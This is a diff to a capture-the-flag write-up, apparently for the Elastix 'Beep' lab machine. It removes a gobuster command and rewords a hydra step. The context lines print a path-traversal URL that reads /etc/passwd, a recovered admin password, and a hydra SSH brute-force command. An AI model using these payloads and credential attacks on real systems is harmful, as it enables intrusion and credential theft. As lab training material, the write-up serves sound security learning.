@@ -45,11 +45,6 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 452.97 seconds
 ```
 
-Gobuster enumeration on the port 443:
-```
-gobuster dir -u https://10.10.10.7 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k
-```
-
 Search Elastix vulnerabilities using `searchsploit`:
 ```
 $ searchsploit elastix
@@ -368,7 +363,7 @@ From here, the Elastix credentials are user `admin` and password `jEhdIekWmdjE`.
 Get the passwd file to list users of the system:
 `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action`
 
-From the passwd file is possible to get usernames and, from the config file, passwords. Then it is possible to use hydra to check for matches:
+From the passwd file is possible to get usernames and, from the config file, passwords. Then it is possible to use hydra to try them as ssh credentials:
 ```
 hydra -L users.txt -P pass.txt 10.10.10.7 -t 4 ssh
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
